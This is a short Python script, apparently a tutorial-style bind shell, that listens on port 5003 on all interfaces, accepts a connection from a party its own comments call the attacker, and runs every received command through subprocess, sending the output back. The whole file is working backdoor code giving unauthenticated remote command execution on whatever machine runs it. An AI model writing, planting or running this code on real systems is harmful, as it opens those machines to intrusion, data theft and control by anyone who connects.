import socket
import subprocess

SERVER_HOST = "0.0.0.0"
SERVER_PORT = 5003
BUFFER_SIZE = 1024

# create the socket object
s = socket.socket()

# bind the socket to all IP addresses of this host
s.bind((SERVER_HOST, SERVER_PORT))

s.listen(5)
print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")

# accept any connections attempted
attacker_socket, attacker_address = s.accept()
print(f"{attacker_address[0]}:{attacker_address[1]} Connected!")

# just sending a message, for demonstration purposes
message = "Hello and Welcome".encode()
attacker_socket.send(message)



while True:
    # receive the command from attacker
    command = attacker_socket.recv(BUFFER_SIZE).decode()
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    # execute the command and retrieve the results
    output = subprocess.getoutput(command)
    # send the results back to the server
    attacker_socket.send(output.encode())
# close client connection
attacker_socket.close()